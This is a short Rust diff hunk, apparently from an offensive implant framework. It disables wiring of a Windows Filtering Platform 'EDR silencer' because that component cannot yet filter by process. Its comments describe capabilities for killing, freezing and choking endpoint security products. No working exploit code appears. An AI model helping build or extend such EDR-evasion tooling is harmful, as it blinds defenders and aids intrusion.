@@ -572,11 +572,13 @@ pub fn assemble_tier(
         None
     };
 
-    // WFP silencer — `UserModeEdrSilencer` is a zero-field unit struct that
-    // resolves FwpmEngineOpen0 from fwpuclnt.dll at call time (no offsets, no
-    // kernel handle). It's always available on Windows with admin rights, so
-    // wire it unconditionally — no build/version dependency.
-    let wfp = Some(Box::new(crate::netsec::UserModeEdrSilencer) as Box<dyn crate::WfpKit>);
+    // WFP silencer — NOT assembled. `UserModeEdrSilencer::block_outbound_for_pid`
+    // always returns `Err` by design (WFP cannot filter on PID; a zero-condition
+    // filter would nuke ALL outbound traffic). Until PID→image-path resolution
+    // (FWPM_CONDITION_ALE_APP_ID) is implemented, wiring it would make the tier
+    // report `wfp=true` while `silence_edr` always fails at runtime — a false
+    // capability signal. Leave `None` so the tier honestly reports wfp=false.
+    let wfp: Option<Box<dyn crate::WfpKit>> = None;
 
     // EDR neutralize (Kill/Freeze/Choke). Freeze+Choke are user-mode FFI that
     // run regardless of offsets; Kill needs the kernel primitive (operator
